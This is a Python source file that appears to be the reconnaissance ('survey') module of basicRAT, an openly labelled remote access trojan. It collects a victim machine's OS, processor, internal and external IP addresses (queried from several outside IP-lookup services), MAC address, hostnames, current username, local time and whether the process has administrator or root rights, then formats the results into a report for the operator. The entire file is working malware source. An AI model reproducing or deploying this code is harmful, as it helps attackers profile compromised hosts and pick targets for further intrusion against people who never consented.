# -*- coding: utf-8 -*-

#
# basicRAT survey module
# https://github.com/vesche/basicRAT
#

import ctypes
import getpass
import os
import platform
import socket
import time
import urllib
import uuid


SURVEY_FORMAT = '''
System Platform     - {}
Processor           - {}
Architecture        - {}
Internal IP         - {}
External IP         - {}
MAC Address         - {}
Internal Hostname   - {}
External Hostname   - {}
Hostname Aliases    - {}
FQDN                - {}
Current User        - {}
System Datetime     - {}
Admin Access        - {}'''


def run(plat):
    # OS information
    sys_platform = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]

    # session information
    username = getpass.getuser()

    # network information
    hostname    = socket.gethostname()
    fqdn        = socket.getfqdn()
    internal_ip = socket.gethostbyname(hostname)
    raw_mac     = uuid.getnode()
    mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))

    # get external ip address
    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw',
                   'wtfismyip.com/text' ]
    external_ip = ''
    for url in ex_ip_grab:
        try:
            external_ip = urllib.urlopen('http://'+url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break

    # reverse dns lookup
    try:
        ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
    except (socket.herror, NameError):
        ext_hostname, aliases = '', []
    aliases = ', '.join(aliases)

    # datetime, local non-DST timezone
    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
         time.localtime())

    # platform specific
    is_admin = False

    if plat == 'win':
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    elif plat in ['nix', 'mac']:
        is_admin = os.getuid() == 0

    admin_access = 'Yes' if is_admin else 'No'

    # return survey results
    return SURVEY_FORMAT.format(sys_platform, processor, architecture,
    internal_ip, external_ip, mac, hostname, ext_hostname, aliases, fqdn,
    username, dt, admin_access)
